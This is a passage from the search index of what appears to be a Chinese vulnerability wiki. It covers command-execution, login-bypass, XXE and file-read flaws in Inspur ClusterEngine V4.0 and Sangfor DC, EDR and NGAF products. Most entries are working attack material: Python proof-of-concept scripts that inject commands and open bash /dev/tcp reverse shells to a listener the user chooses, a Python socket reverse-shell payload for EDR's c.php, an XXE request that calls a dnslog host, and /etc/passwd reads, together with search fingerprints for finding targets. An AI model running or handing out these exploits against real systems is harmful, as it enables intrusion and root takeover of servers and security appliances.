\\033[0m\") sys.exit(0) except Exception as e: print(\"\\033[31m[x] 请求失败 \\033[0m\", e) def POC_2(target_url, cmd): vuln_url = target_url + \"/sysShell\" headers = { \"Content-Type\": \"application/x-www-form-urlencoded; charset=UTF-8\", \"Cookie\": \"lang=cn\" } data = \"op=doPlease\u0026node=cu01\u0026command={}\".format(cmd) try: requests.packages.urllib3.disable_warnings(InsecureRequestWarning) response = requests.post(url=vuln_url, headers=headers, data=data, verify=False, timeout=5) print(\"\\033[32m[o] 响应为:\\n{} \\033[0m\".format(response.text)) except Exception as e: print(\"\\033[31m[x] 请求失败 \\033[0m\", e) if __name__ == '__main__': title() cmd = 'cat /etc/passwd' target_url = str(input(\"\\033[35mPlease input Attack Url\\nUrl \u003e\u003e\u003e \\033[0m\")) POC_1(target_url, cmd) ","date":"0001-01-01","objectID":"/%E6%B5%AA%E6%BD%AEclusterenginev4.0-sysshell-%E4%BB%BB%E6%84%8F%E5%91%BD%E4%BB%A4%E6%89%A7%E8%A1%8C%E6%BC%8F%E6%B4%9E/:5:0","tags":null,"title":"","uri":"/%E6%B5%AA%E6%BD%AEclusterenginev4.0-sysshell-%E4%BB%BB%E6%84%8F%E5%91%BD%E4%BB%A4%E6%89%A7%E8%A1%8C%E6%BC%8F%E6%B4%9E/"},{"categories":null,"content":"浪潮ClusterEngineV4.0 任意用户登录漏洞 ","date":"0001-01-01","objectID":"/%E6%B5%AA%E6%BD%AEclusterenginev4.0-%E4%BB%BB%E6%84%8F%E7%94%A8%E6%88%B7%E7%99%BB%E5%BD%95%E6%BC%8F%E6%B4%9E/:0:0","tags":null,"title":"","uri":"/%E6%B5%AA%E6%BD%AEclusterenginev4.0-%E4%BB%BB%E6%84%8F%E7%94%A8%E6%88%B7%E7%99%BB%E5%BD%95%E6%BC%8F%E6%B4%9E/"},{"categories":null,"content":"漏洞描述 浪潮ClusterEngineV4.0 存在任意用户登录漏洞，构造恶意的用户名和密码即可获取后台权限 ","date":"0001-01-01","objectID":"/%E6%B5%AA%E6%BD%AEclusterenginev4.0-%E4%BB%BB%E6%84%8F%E7%94%A8%E6%88%B7%E7%99%BB%E5%BD%95%E6%BC%8F%E6%B4%9E/:1:0","tags":null,"title":"","uri":"/%E6%B5%AA%E6%BD%AEclusterenginev4.0-%E4%BB%BB%E6%84%8F%E7%94%A8%E6%88%B7%E7%99%BB%E5%BD%95%E6%BC%8F%E6%B4%9E/"},{"categories":null,"content":"漏洞影响 浪潮ClusterEngineV4.0 ","date":"0001-01-01","objectID":"/%E6%B5%AA%E6%BD%AEclusterenginev4.0-%E4%BB%BB%E6%84%8F%E7%94%A8%E6%88%B7%E7%99%BB%E5%BD%95%E6%BC%8F%E6%B4%9E/:2:0","tags":null,"title":"","uri":"/%E6%B5%AA%E6%BD%AEclusterenginev4.0-%E4%BB%BB%E6%84%8F%E7%94%A8%E6%88%B7%E7%99%BB%E5%BD%95%E6%BC%8F%E6%B4%9E/"},{"categories":null,"content":"网络测绘 title=\"TSCEV4.0\" ","date":"0001-01-01","objectID":"/%E6%B5%AA%E6%BD%AEclusterenginev4.0-%E4%BB%BB%E6%84%8F%E7%94%A8%E6%88%B7%E7%99%BB%E5%BD%95%E6%BC%8F%E6%B4%9E/:3:0","tags":null,"title":"","uri":"/%E6%B5%AA%E6%BD%AEclusterenginev4.0-%E4%BB%BB%E6%84%8F%E7%94%A8%E6%88%B7%E7%99%BB%E5%BD%95%E6%BC%8F%E6%B4%9E/"},{"categories":null,"content":"漏洞复现 登录页面如下 USER： admin|pwd PASS: 任意 成功登陆后台 部分功能是无法使用的 ","date":"0001-01-01","objectID":"/%E6%B5%AA%E6%BD%AEclusterenginev4.0-%E4%BB%BB%E6%84%8F%E7%94%A8%E6%88%B7%E7%99%BB%E5%BD%95%E6%BC%8F%E6%B4%9E/:4:0","tags":null,"title":"","uri":"/%E6%B5%AA%E6%BD%AEclusterenginev4.0-%E4%BB%BB%E6%84%8F%E7%94%A8%E6%88%B7%E7%99%BB%E5%BD%95%E6%BC%8F%E6%B4%9E/"},{"categories":null,"content":"浪潮ClusterEngineV4.0 远程命令执行漏洞 CVE-2020-21224 ","date":"0001-01-01","objectID":"/%E6%B5%AA%E6%BD%AEclusterenginev4.0-%E8%BF%9C%E7%A8%8B%E5%91%BD%E4%BB%A4%E6%89%A7%E8%A1%8C%E6%BC%8F%E6%B4%9E-cve-2020-21224/:0:0","tags":null,"title":"","uri":"/%E6%B5%AA%E6%BD%AEclusterenginev4.0-%E8%BF%9C%E7%A8%8B%E5%91%BD%E4%BB%A4%E6%89%A7%E8%A1%8C%E6%BC%8F%E6%B4%9E-cve-2020-21224/"},{"categories":null,"content":"漏洞描述 浪潮服务器群集管理系统存在危险字符未过滤，导致远程命令执行 ","date":"0001-01-01","objectID":"/%E6%B5%AA%E6%BD%AEclusterenginev4.0-%E8%BF%9C%E7%A8%8B%E5%91%BD%E4%BB%A4%E6%89%A7%E8%A1%8C%E6%BC%8F%E6%B4%9E-cve-2020-21224/:1:0","tags":null,"title":"","uri":"/%E6%B5%AA%E6%BD%AEclusterenginev4.0-%E8%BF%9C%E7%A8%8B%E5%91%BD%E4%BB%A4%E6%89%A7%E8%A1%8C%E6%BC%8F%E6%B4%9E-cve-2020-21224/"},{"categories":null,"content":"漏洞影响 浪潮ClusterEngineV4.0 ","date":"0001-01-01","objectID":"/%E6%B5%AA%E6%BD%AEclusterenginev4.0-%E8%BF%9C%E7%A8%8B%E5%91%BD%E4%BB%A4%E6%89%A7%E8%A1%8C%E6%BC%8F%E6%B4%9E-cve-2020-21224/:2:0","tags":null,"title":"","uri":"/%E6%B5%AA%E6%BD%AEclusterenginev4.0-%E8%BF%9C%E7%A8%8B%E5%91%BD%E4%BB%A4%E6%89%A7%E8%A1%8C%E6%BC%8F%E6%B4%9E-cve-2020-21224/"},{"categories":null,"content":"网络测绘 title=\"TSCEV4.0\" ","date":"0001-01-01","objectID":"/%E6%B5%AA%E6%BD%AEclusterenginev4.0-%E8%BF%9C%E7%A8%8B%E5%91%BD%E4%BB%A4%E6%89%A7%E8%A1%8C%E6%BC%8F%E6%B4%9E-cve-2020-21224/:3:0","tags":null,"title":"","uri":"/%E6%B5%AA%E6%BD%AEclusterenginev4.0-%E8%BF%9C%E7%A8%8B%E5%91%BD%E4%BB%A4%E6%89%A7%E8%A1%8C%E6%BC%8F%E6%B4%9E-cve-2020-21224/"},{"categories":null,"content":"漏洞复现 登录页面如下 由于登录页面没有发现验证码，进行账号爆破 当burpsuite爆破完成时，注意到POST数据中如果带有 ;’ ，响应数据包发生异常。 通过响应包信息，猜测可能存在一个远程执行代码漏洞，并将此数据包放在repeater中，我发现如果发布数据中有 一个 ’ ，系统将抛出异常。 进一步测试时，我发现username参数或password任一参数如果包含 ’ ，将引发此异常 定尝试发送 ’ ’ 来查看响应包。 我注意到 grep 命令错误，服务端的代码可能是这样 var1 = `grep xxxx` var2 = $(python -c \"from crypt import crypt;print crypt('$username','$1$$var1')\") 尝试发送 -V 和 –help 来查看响应包，响应包证实了猜测 尝试读取 /etc/passswd 尝试列目录 确认存在一个远程执行命令执行漏洞，经过fuzz，得到以下payload 反弹 shell op=login\u0026username=1 2\\',\\'1\\'\\); `bash%20-i%20%3E%26%20%2Fdev%2Ftcp%2F10.16.11.81%2F80%200%3E%261` payload发送后, 在 kali linux 服务器上获取了一个 root 权限的 shell 上面是原文的测试思路，但经过重新测试之后发现还有另一种简单方法 POC测试(出现 root:x:0:0 则存在漏洞) op=login\u0026username=test`$(cat /etc/passwd)` {\"err\":\"/bin/sh: root:x:0:0:root:/root:/bin/bash: No such file or directory\\n\",\"exitcode\":1,\"out\":\"the user test does not exist\\nerror:1\\n\"} 反弹shell op=login\u0026username=test`$(bash%20-i%20%3E%26%20%2Fdev%2Ftcp%2F{IP}}%2F{PORT}%200%3E%261)` ","date":"0001-01-01","objectID":"/%E6%B5%AA%E6%BD%AEclusterenginev4.0-%E8%BF%9C%E7%A8%8B%E5%91%BD%E4%BB%A4%E6%89%A7%E8%A1%8C%E6%BC%8F%E6%B4%9E-cve-2020-21224/:4:0","tags":null,"title":"","uri":"/%E6%B5%AA%E6%BD%AEclusterenginev4.0-%E8%BF%9C%E7%A8%8B%E5%91%BD%E4%BB%A4%E6%89%A7%E8%A1%8C%E6%BC%8F%E6%B4%9E-cve-2020-21224/"},{"categories":null,"content":"漏洞POC import requests import sys import random import re from requests.packages.urllib3.exceptions import InsecureRequestWarning def title(): print('+------------------------------------------') print('+ \\033[34mPOC_Des: http://wiki.peiqi.tech \\033[0m') print('+ \\033[34mGithub : https://github.com/PeiQi0 \\033[0m') print('+ \\033[34m公众号 : PeiQi文库 \\033[0m') print('+ \\033[34mVersion: 浪潮ClusterEngineV4.0 \\033[0m') print('+ \\033[36m使用格式: python3 poc.py \\033[0m') print('+ \\033[36mUrl \u003e\u003e\u003e http://xxx.xxx.xxx.xxx \\033[0m') print('+ \\033[36mIP \u003e\u003e\u003e xxx.xxx.xxx.xxx:9999 \\033[0m') print('+ \\033[36mPORT \u003e\u003e\u003e 9999 \\033[0m') print('+------------------------------------------') def POC_1(target_url): vuln_url = target_url + \"/login\" headers = { \"User-Agent\": \"Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/86.0.4240.111 Safari/537.36\", \"Content-Type\": \"application/x-www-form-urlencoded\", \"Accept\": \"text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.9\", } data = \"op=login\u0026username=test`$(cat /etc/passwd)`\" try: requests.packages.urllib3.disable_warnings(InsecureRequestWarning) response = requests.post(url=vuln_url, headers=headers, data=data, verify=False, timeout=4) etc_passwd = re.findall(r'\\{\"err\":\"/bin/sh: (.*?): No such', response.text) if response.status_code == 200 and \"root:x:0:0\" in response.text: print(\"\\033[32m[o] 目标 {} 可能存在漏洞, 响应为:{} \\033[0m\".format(target_url, etc_passwd[0])) POC_2(target_url) else: print(\"\\033[31m[x] 目标 {} 不存在漏洞 \\033[0m\".format(target_url)) except Exception as e: print(\"\\033[31m[x] 目标 {} 请求失败 \\033[0m\".format(target_url)) def POC_2(target_url): IP = str(input(\"\\033[35m请输入监听IP \u003e\u003e\u003e \\033[0m\")) PORT = str(input(\"\\033[35m请输入监听PORT \u003e\u003e\u003e \\033[0m\")) vuln_url = target_url + \"/login\" headers = { \"User-Agent\": \"Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/86.0.4240.111 Safari/537.36\", \"Content-Type\": \"application/x-www-form-urlencoded\", \"Accept\": \"text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.9\", } data = \"op=login\u0026username=`bash%20-i%20%3E%26%20%2Fdev%2Ftcp%2F{}%2F{}%200%3E%261`\".format(IP, PORT) try: requests.packages.urllib3.disable_warnings(InsecureRequestWarning) response = requests.post(url=vuln_url, headers=headers, data=data, verify=False) except Exception as e: print(\"\\033[31m[x] 目标 {} 请求失败 \\033[0m\".format(target_url)) if __name__ == '__main__': title() target_url = str(input(\"\\033[35mPlease input Attack Url\\nUrl \u003e\u003e\u003e \\033[0m\")) POC_1(target_url) ","date":"0001-01-01","objectID":"/%E6%B5%AA%E6%BD%AEclusterenginev4.0-%E8%BF%9C%E7%A8%8B%E5%91%BD%E4%BB%A4%E6%89%A7%E8%A1%8C%E6%BC%8F%E6%B4%9E-cve-2020-21224/:5:0","tags":null,"title":"","uri":"/%E6%B5%AA%E6%BD%AEclusterenginev4.0-%E8%BF%9C%E7%A8%8B%E5%91%BD%E4%BB%A4%E6%89%A7%E8%A1%8C%E6%BC%8F%E6%B4%9E-cve-2020-21224/"},{"categories":null,"content":"深信服 DC数据中心管理系统 sangforindex XML实体注入漏洞 ","date":"0001-01-01","objectID":"/%E6%B7%B1%E4%BF%A1%E6%9C%8D-dc%E6%95%B0%E6%8D%AE%E4%B8%AD%E5%BF%83%E7%AE%A1%E7%90%86%E7%B3%BB%E7%BB%9F-sangforindex-xml%E5%AE%9E%E4%BD%93%E6%B3%A8%E5%85%A5%E6%BC%8F%E6%B4%9E/:0:0","tags":null,"title":"","uri":"/%E6%B7%B1%E4%BF%A1%E6%9C%8D-dc%E6%95%B0%E6%8D%AE%E4%B8%AD%E5%BF%83%E7%AE%A1%E7%90%86%E7%B3%BB%E7%BB%9F-sangforindex-xml%E5%AE%9E%E4%BD%93%E6%B3%A8%E5%85%A5%E6%BC%8F%E6%B4%9E/"},{"categories":null,"content":"漏洞描述 深信服 DC数据中心管理系统 sangforindex 接口存在XML实体注入漏洞，攻击者可以发送特定的请求包造成XML实体注入 ","date":"0001-01-01","objectID":"/%E6%B7%B1%E4%BF%A1%E6%9C%8D-dc%E6%95%B0%E6%8D%AE%E4%B8%AD%E5%BF%83%E7%AE%A1%E7%90%86%E7%B3%BB%E7%BB%9F-sangforindex-xml%E5%AE%9E%E4%BD%93%E6%B3%A8%E5%85%A5%E6%BC%8F%E6%B4%9E/:1:0","tags":null,"title":"","uri":"/%E6%B7%B1%E4%BF%A1%E6%9C%8D-dc%E6%95%B0%E6%8D%AE%E4%B8%AD%E5%BF%83%E7%AE%A1%E7%90%86%E7%B3%BB%E7%BB%9F-sangforindex-xml%E5%AE%9E%E4%BD%93%E6%B3%A8%E5%85%A5%E6%BC%8F%E6%B4%9E/"},{"categories":null,"content":"漏洞影响 深信服 DC数据中心管理系统 ","date":"0001-01-01","objectID":"/%E6%B7%B1%E4%BF%A1%E6%9C%8D-dc%E6%95%B0%E6%8D%AE%E4%B8%AD%E5%BF%83%E7%AE%A1%E7%90%86%E7%B3%BB%E7%BB%9F-sangforindex-xml%E5%AE%9E%E4%BD%93%E6%B3%A8%E5%85%A5%E6%BC%8F%E6%B4%9E/:2:0","tags":null,"title":"","uri":"/%E6%B7%B1%E4%BF%A1%E6%9C%8D-dc%E6%95%B0%E6%8D%AE%E4%B8%AD%E5%BF%83%E7%AE%A1%E7%90%86%E7%B3%BB%E7%BB%9F-sangforindex-xml%E5%AE%9E%E4%BD%93%E6%B3%A8%E5%85%A5%E6%BC%8F%E6%B4%9E/"},{"categories":null,"content":"网络测绘 \"SANGFOR 数据中心\" ","date":"0001-01-01","objectID":"/%E6%B7%B1%E4%BF%A1%E6%9C%8D-dc%E6%95%B0%E6%8D%AE%E4%B8%AD%E5%BF%83%E7%AE%A1%E7%90%86%E7%B3%BB%E7%BB%9F-sangforindex-xml%E5%AE%9E%E4%BD%93%E6%B3%A8%E5%85%A5%E6%BC%8F%E6%B4%9E/:3:0","tags":null,"title":"","uri":"/%E6%B7%B1%E4%BF%A1%E6%9C%8D-dc%E6%95%B0%E6%8D%AE%E4%B8%AD%E5%BF%83%E7%AE%A1%E7%90%86%E7%B3%BB%E7%BB%9F-sangforindex-xml%E5%AE%9E%E4%BD%93%E6%B3%A8%E5%85%A5%E6%BC%8F%E6%B4%9E/"},{"categories":null,"content":"漏洞复现 登陆页面 验证POC POST /src/sangforindex HTTP/1.1 Host: Content-Type: text/xml \u003c?xml version=\"1.0\" encoding=\"utf-8\" ?\u003e \u003c!DOCTYPE root [ \u003c!ENTITY rootas SYSTEM \"http://xgsg1k.dnslog.cn\"\u003e ]\u003e \u003cxxx\u003e \u0026rootas; \u003c/xxx\u003e ","date":"0001-01-01","objectID":"/%E6%B7%B1%E4%BF%A1%E6%9C%8D-dc%E6%95%B0%E6%8D%AE%E4%B8%AD%E5%BF%83%E7%AE%A1%E7%90%86%E7%B3%BB%E7%BB%9F-sangforindex-xml%E5%AE%9E%E4%BD%93%E6%B3%A8%E5%85%A5%E6%BC%8F%E6%B4%9E/:4:0","tags":null,"title":"","uri":"/%E6%B7%B1%E4%BF%A1%E6%9C%8D-dc%E6%95%B0%E6%8D%AE%E4%B8%AD%E5%BF%83%E7%AE%A1%E7%90%86%E7%B3%BB%E7%BB%9F-sangforindex-xml%E5%AE%9E%E4%BD%93%E6%B3%A8%E5%85%A5%E6%BC%8F%E6%B4%9E/"},{"categories":null,"content":"深信服 EDR c.php 远程命令执行漏洞 CNVD-2020-46552 ","date":"0001-01-01","objectID":"/%E6%B7%B1%E4%BF%A1%E6%9C%8D-edr-c.php-%E8%BF%9C%E7%A8%8B%E5%91%BD%E4%BB%A4%E6%89%A7%E8%A1%8C%E6%BC%8F%E6%B4%9E-cnvd-2020-46552/:0:0","tags":null,"title":"","uri":"/%E6%B7%B1%E4%BF%A1%E6%9C%8D-edr-c.php-%E8%BF%9C%E7%A8%8B%E5%91%BD%E4%BB%A4%E6%89%A7%E8%A1%8C%E6%BC%8F%E6%B4%9E-cnvd-2020-46552/"},{"categories":null,"content":"漏洞描述 深信服终端检测响应平台是深信服公司开发的一套EDR系统。攻击者利用该漏洞，可向目标服务器发送恶意构造的HTTP请求，从而获得目标服务器的权限，实现远程代码控制执行。 ","date":"0001-01-01","objectID":"/%E6%B7%B1%E4%BF%A1%E6%9C%8D-edr-c.php-%E8%BF%9C%E7%A8%8B%E5%91%BD%E4%BB%A4%E6%89%A7%E8%A1%8C%E6%BC%8F%E6%B4%9E-cnvd-2020-46552/:1:0","tags":null,"title":"","uri":"/%E6%B7%B1%E4%BF%A1%E6%9C%8D-edr-c.php-%E8%BF%9C%E7%A8%8B%E5%91%BD%E4%BB%A4%E6%89%A7%E8%A1%8C%E6%BC%8F%E6%B4%9E-cnvd-2020-46552/"},{"categories":null,"content":"漏洞影响 EDR v3.2.16 EDR v3.2.17 EDR v3.2.19 ","date":"0001-01-01","objectID":"/%E6%B7%B1%E4%BF%A1%E6%9C%8D-edr-c.php-%E8%BF%9C%E7%A8%8B%E5%91%BD%E4%BB%A4%E6%89%A7%E8%A1%8C%E6%BC%8F%E6%B4%9E-cnvd-2020-46552/:2:0","tags":null,"title":"","uri":"/%E6%B7%B1%E4%BF%A1%E6%9C%8D-edr-c.php-%E8%BF%9C%E7%A8%8B%E5%91%BD%E4%BB%A4%E6%89%A7%E8%A1%8C%E6%BC%8F%E6%B4%9E-cnvd-2020-46552/"},{"categories":null,"content":"漏洞复现 https://xxx.xxx.xxx.xxx/tool/log/c.php?strip_slashes=system\u0026limit=whoami https://xxx.xxx.xxx.xxx/tool/log/c.php?strip_slashes=system\u0026host=whoami https://xxx.xxx.xxx.xxx/tool/log/c.php?strip_slashes=system\u0026path=whoami https://xxx.xxx.xxx.xxx/tool/log/c.php?strip_slashes=system\u0026row=whoami 反弹shell POST /tool/log/c.php HTTP/1.1 Host: x.x.x.x Upgrade-Insecure-Requests: 1 Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,image/apng,*/*;q=0.8 Content-Type: application/x-www-form-urlencoded;charset=utf-8 Accept-Language: zh-CN,zh;q=0.9 Content-Length: 256 strip_slashes=system\u0026host=python -c 'import socket,subprocess,os;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect((\"xxx.xxx.xxx.xxx\",9999));os.dup2(s.fileno(),0); os.dup2(s.fileno(),1); os.dup2(s.fileno(),2);p=subprocess.call([\"/bin/sh\",\"-i\"]);' 向 /tool/log/c.php POST以下数据即可 strip_slashes=system\u0026host=python -c 'import socket,subprocess,os;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect((\"xxx.xxx.xxx.xxx\",9999));os.dup2(s.fileno(),0); os.dup2(s.fileno(),1); os.dup2(s.fileno(),2);p=subprocess.call([\"/bin/sh\",\"-i\"]);' ","date":"0001-01-01","objectID":"/%E6%B7%B1%E4%BF%A1%E6%9C%8D-edr-c.php-%E8%BF%9C%E7%A8%8B%E5%91%BD%E4%BB%A4%E6%89%A7%E8%A1%8C%E6%BC%8F%E6%B4%9E-cnvd-2020-46552/:3:0","tags":null,"title":"","uri":"/%E6%B7%B1%E4%BF%A1%E6%9C%8D-edr-c.php-%E8%BF%9C%E7%A8%8B%E5%91%BD%E4%BB%A4%E6%89%A7%E8%A1%8C%E6%BC%8F%E6%B4%9E-cnvd-2020-46552/"},{"categories":null,"content":"深信服 EDR 后台任意用户登陆漏洞 ","date":"0001-01-01","objectID":"/%E6%B7%B1%E4%BF%A1%E6%9C%8D-edr-%E5%90%8E%E5%8F%B0%E4%BB%BB%E6%84%8F%E7%94%A8%E6%88%B7%E7%99%BB%E9%99%86%E6%BC%8F%E6%B4%9E/:0:0","tags":null,"title":"","uri":"/%E6%B7%B1%E4%BF%A1%E6%9C%8D-edr-%E5%90%8E%E5%8F%B0%E4%BB%BB%E6%84%8F%E7%94%A8%E6%88%B7%E7%99%BB%E9%99%86%E6%BC%8F%E6%B4%9E/"},{"categories":null,"content":"漏洞描述 深信服终端检测响应平台是深信服公司开发的一套EDR系统。攻击者利用该漏洞，登录任意用户 ","date":"0001-01-01","objectID":"/%E6%B7%B1%E4%BF%A1%E6%9C%8D-edr-%E5%90%8E%E5%8F%B0%E4%BB%BB%E6%84%8F%E7%94%A8%E6%88%B7%E7%99%BB%E9%99%86%E6%BC%8F%E6%B4%9E/:1:0","tags":null,"title":"","uri":"/%E6%B7%B1%E4%BF%A1%E6%9C%8D-edr-%E5%90%8E%E5%8F%B0%E4%BB%BB%E6%84%8F%E7%94%A8%E6%88%B7%E7%99%BB%E9%99%86%E6%BC%8F%E6%B4%9E/"},{"categories":null,"content":"漏洞影响 EDR \u003c= v3.2.19 ","date":"0001-01-01","objectID":"/%E6%B7%B1%E4%BF%A1%E6%9C%8D-edr-%E5%90%8E%E5%8F%B0%E4%BB%BB%E6%84%8F%E7%94%A8%E6%88%B7%E7%99%BB%E9%99%86%E6%BC%8F%E6%B4%9E/:2:0","tags":null,"title":"","uri":"/%E6%B7%B1%E4%BF%A1%E6%9C%8D-edr-%E5%90%8E%E5%8F%B0%E4%BB%BB%E6%84%8F%E7%94%A8%E6%88%B7%E7%99%BB%E9%99%86%E6%BC%8F%E6%B4%9E/"},{"categories":null,"content":"漏洞复现 https://xxx.xxx.xxx.xxx/ui/login.php?user=admin 注意最后的admin需要为存在的用户名 ","date":"0001-01-01","objectID":"/%E6%B7%B1%E4%BF%A1%E6%9C%8D-edr-%E5%90%8E%E5%8F%B0%E4%BB%BB%E6%84%8F%E7%94%A8%E6%88%B7%E7%99%BB%E9%99%86%E6%BC%8F%E6%B4%9E/:3:0","tags":null,"title":"","uri":"/%E6%B7%B1%E4%BF%A1%E6%9C%8D-edr-%E5%90%8E%E5%8F%B0%E4%BB%BB%E6%84%8F%E7%94%A8%E6%88%B7%E7%99%BB%E9%99%86%E6%BC%8F%E6%B4%9E/"},{"categories":null,"content":"深信服 NGAF下一代防火墙 loadfile.php 任意文件读取漏洞 ","date":"0001-01-01","objectID":"/%E6%B7%B1%E4%BF%A1%E6%9C%8D-ngaf%E4%B8%8B%E4%B8%80%E4%BB%A3%E9%98%B2%E7%81%AB%E5%A2%99-loadfile.php-%E4%BB%BB%E6%84%8F%E6%96%87%E4%BB%B6%E8%AF%BB%E5%8F%96%E6%BC%8F%E6%B4%9E/:0:0","tags":null,"title":"","uri":"/%E6%B7%B1%E4%BF%A1%E6%9C%8D-ngaf%E4%B8%8B%E4%B8%80%E4%BB%A3%E9%98%B2%E7%81%AB%E5%A2%99-loadfile.php-%E4%BB%BB%E6%84%8F%E6%96%87%E4%BB%B6%E8%AF%BB%E5%8F%96%E6%BC%8F%E6%B4%9E/"},{"categories":null,"content":"漏洞描述 深信服下一代防火墙是一款以应用安全需求出发而设计的下一代应用防火墙。深信服下一代防火墙在 loadfile.php 处存在文件读取漏洞，攻击者可通过该漏洞读取系统重要文件（如数据库配置文件、系统配置文件）、数据库配置文件等等。 ","date":"0001-01-01","objectID":"/%E6%B7%B1%E4%BF%A1%E6%9C%8D-ngaf%E4%B8%8B%E4%B8%80%E4%BB%A3%E9%98%B2%E7%81%AB%E5%A2%99-loadfile.php-%E4%BB%BB%E6%84%8F%E6%96%87%E4%BB%B6%E8%AF%BB%E5%8F%96%E6%BC%8F%E6%B4%9E/:1:0","tags":null,"title":"","uri":"/%E6%B7%B1%E4%BF%A1%E6%9C%8D-ngaf%E4%B8%8B%E4%B8%80%E4%BB%A3%E9%98%B2%E7%81%AB%E5%A2%99-loadfile.php-%E4%BB%BB%E6%84%8F%E6%96%87%E4%BB%B6%E8%AF%BB%E5%8F%96%E6%BC%8F%E6%B4%9E/"},{"categories":null,"content":"漏洞影响 深信服 NGAF下一代防火墙 ","date":"0001-01-01","objectID":"/%E6%B7%B1%E4%BF%A1%E6%9C%8D-ngaf%E4%B8%8B%E4%B8%80%E4%BB%A3%E9%98%B2%E7%81%AB%E5%A2%99-loadfile.php-%E4%BB%BB%E6%84%8F%E6%96%87%E4%BB%B6%E8%AF%BB%E5%8F%96%E6%BC%8F%E6%B4%9E/:2:0","tags":null,"title":"","uri":"/%E6%B7%B1%E4%BF%A1%E6%9C%8D-ngaf%E4%B8%8B%E4%B8%80%E4%BB%A3%E9%98%B2%E7%81%AB%E5%A2%99-loadfile.php-%E4%BB%BB%E6%84%8F%E6%96%87%E4%BB%B6%E8%AF%BB%E5%8F%96%E6%BC%8F%E6%B4%9E/"},{"categories":null,"content":"网络测绘 \"Redirect.php?url=LogInOut.php\" ","date":"0001-01-01","objectID":"/%E6%B7%B1%E4%BF%A1%E6%9C%8D-ngaf%E4%B8%8B%E4%B8%80%E4%BB%A3%E9%98%B2%E7%81%AB%E5%A2%99-loadfile.php-%E4%BB%BB%E6%84%8F%E6%96%87%E4%BB%B6%E8%AF%BB%E5%8F%96%E6%BC%8F%E6%B4%9E/:3:0","tags":null,"title":"","uri":"/%E6%B7%B1%E4%BF%A1%E6%9C%8D-ngaf%E4%B8%8B%E4%B8%80%E4%BB%A3%E9%98%B2%E7%81%AB%E5%A2%99-loadfile.php-%E4%BB%BB%E6%84%8F%E6%96%87%E4%BB%B6%E8%AF%BB%E5%8F%96%E6%BC%8F%E6%B4%9E/"},{"categories":null,"content":"漏洞复现 登陆页面 poc GET /svpn_html/loadfile.php?file=/etc/./passwd HTTP/1.1 Host: User-Agent: Opera/8.90.(Windows NT 6.0; is-IS) Presto/2.9.177 Version/10.00 Accept-Encoding: gzip, deflate Accept: */* y-forwarded-for: 127.0.0.1 ","date":"0001-01-01","objectID":"/%E6%B7%B1%E4%BF%A1%E6%9C%8D-ngaf%E4%B8%8B%E4%B8%80%E4%BB%A3%E9%98%B2%E7%81%AB%E5%A2%99-loadfile.php-%E4%BB%BB%E6%84%8F%E6%96%87%E4%BB%B6%E8%AF%BB%E5%8F%96%E6%BC%8F%E6%B4%9E/:4:0","tags":null,"title":"","uri":"/%E6%B7%B1%E4%BF%A1%E6%9C%8D-ngaf%E4%B8%8B%E4%B8%80%E4%BB%A3%E9%98%B2%E7%81%AB%E5%A2%99-loadfile.php-%E4%BB%BB%E6%84%8F%E6%96%87%E4%BB%B6%E8%AF%BB%E5%8F%96%E6%BC%8F%E6%B4%9E/"},{"categories":null,"content":"深信服 NGAF下一代防火墙 login.cgi 远程命令执行漏洞 ","date":"0001-01-01","objectID":"/%E6%B7%B1%E4%BF%A1%E6%9C%8D-ngaf%E4%B8%8B%E4%B8%80%E4%BB%A3%E9%98%B2%E7%81%AB%E5%A2%99-login.cgi-%E8%BF%9C%E7%A8%8B%E5%91%BD%E4%BB%A4%E6%89%A7%E8%A1%8C%E6%BC%8F%E6%B4%9E/:0:0","tags":null,"title":"","uri":"/%E6%B7%B1%E4%BF%A1%E6%9C%8D-ngaf%E4%B8%8B%E4%B8%80%E4%BB%A3%E9%98%B2%E7%81%AB%E5%A2%99-login.cgi-%E8%BF%9C%E7%A8%8B%E5%91%BD%E4%BB%A4%E6%89%A7%E8%A1%8C%E6%BC%8F%E6%B4%9E/"},{"categories":null,"content":"漏洞描述 深信服下一代防火墙是一款以应用安全需求出发而设计的下一代应用防火墙。深信服下一代防火墙在 login.cgi 路径下，PHPSESSID 处存在命令执行漏洞。攻击者可通过该漏洞在服务器端任意执行代码，写入后门，获取服务器权限，进而控制整个web服务器。 ","date":"0001-01-01","objectID":"/%E6%B7%B1%E4%BF%A1%E6%9C%8D-ngaf%E4%B8%8B%E4%B8%80%E4%BB%A3%E9%98%B2%E7%81%AB%E5%A2%99-login.cgi-%E8%BF%9C%E7%A8%8B%E5%91%BD%E4%BB%A4%E6%89%A7%E8%A1%8C%E6%BC%8F%E6%B4%9E/:1:0","tags":null,"title":"","uri":"/%E6%B7%B1%E4%BF%A1%E6%9C%8D-ngaf%E4%B8%8B%E4%B8%80%E4%BB%A3%E9%98%B2%E7%81%AB%E5%A2%99-login.cgi-%E8%BF%9C%E7%A8%8B%E5%91%BD%E4%BB%A4%E6%89%A7%E8%A1%8C%E6%BC%8F%E6%B4%9E/"},{"categories":null,"content":"漏洞影响 深信服 NGAF下一代防火墙 ","date":"0001-01-01","objectID":"/%E6%B7%B1%E4%BF%A1%E6%9C%8D-ngaf%E4%B8%8B%E4%B8%80%E4%BB%A3%E9%98%B2%E7%81%AB%E5%A2%99-login.cgi-%E8%BF%9C%E7%A8%8B%E5%91%BD%E4%BB%A4%E6%89%A7%E8%A1%8C%E6%BC%8F%E6%B4%9E/:2:0","tags":null,"title":"","uri":"/%E6%B7%B1%E4%BF%A1%E6%9C%8D-ngaf%E4%B8%8B%E4%B8%80%E4%BB%A3%E9%98%B2%E7%81%AB%E5%A2%99-login.cgi-%E8%BF%9C%E7%A8%8B%E5%91%BD%E4%BB%A4%E6%89%A7%E8%A1%8C%E6%BC%8F%E6%B4%9E/"},{"categories":null,"content":"网络测绘 \"Redirect.php?url=LogInOut.php\" 